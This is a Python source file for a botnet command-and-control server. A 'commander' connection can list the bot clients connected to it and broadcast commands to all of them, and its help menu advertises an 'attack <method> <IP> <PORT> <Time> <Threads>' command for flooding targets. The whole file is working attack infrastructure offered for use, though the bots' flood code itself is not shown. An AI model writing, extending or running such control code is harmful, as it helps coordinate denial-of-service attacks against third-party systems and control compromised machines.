import socket
import threading
import os  # To change the terminal title dynamically

# Dictionary to hold clients and their usernames
clinum = 0
clients = {}

def update_server_title():
    global clinum
    # Update the server window title with the current number of clients connected
    os.system(f'title Connected: {clinum}')

def handle_client(client_socket, client_address):
    global clinum
    username = client_socket.recv(1024).decode('utf-8')  # Receive the username to identify if it's a commander or client
    
    clients[client_socket] = username  # Store the client with their username
    
    if username == "commander":
        # Handle commands from the commander
        while True:
            try:
                command = client_socket.recv(1024).decode('utf-8')  # Get command from commander
                if command:
                    if command.lower() == "help":
                        # Send the help menu to the commander
                        help_menu = (
                            "Available commands:\n"
                            "help - Show this help menu\n"
                            "list - List all connected clients\n"
                            "attack <method> <IP> <PORT> <Time> <Threads>"
                            "<any other command> - Send command to clients"
                        )
                        client_socket.send(help_menu.encode('utf-8'))
                    
                    elif command == "list":
                        # Send list of connected clients to the commander in number count - IP:PORT format
                        connected_clients = "Connected clients:\n"
                        client_count = 1  # Start counting from 1
                        for client, user in clients.items():
                            if user == "client":  # Only list the clients, not the commander
                                client_ip, client_port = client.getpeername()
                                connected_clients += f"{client_count} - {client_ip}:{client_port}\n"
                                client_count += 1
                        client_socket.send(connected_clients.encode('utf-8'))
                    
                    else:
                        # Broadcast the command to all clients except the commander
                        for client, user in clients.items():
                            if user == "client":  # Only send to clients
                                client.send(command.encode('utf-8'))
                else:
                    break

            except Exception as e:
                break
    else:
        # Handle client listening
        clinum += 1  # Increment clinum only for clients
        update_server_title()  # Update the title with the new client count
        while True:
            try:
                command = client_socket.recv(1024).decode('utf-8')
                if command:
                    print(f"Received command from commander: {command}")
                else:
                    break
            except Exception as e:
                clinum -= 1  # Decrease the client count
                break

    # Clean up after a client disconnects
    clients.pop(client_socket, None)
    update_server_title()  # Update the title after a client disconnects
    client_socket.close()

def start_server(host, port):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(5)
    print(f"Server started on {host}:{port}...")
    
    while True:
        client_socket, client_address = server.accept()
        thread = threading.Thread(target=handle_client, args=(client_socket, client_address))
        thread.start()

if __name__ == "__main__":
    start_server("127.0.0.1", 65432)
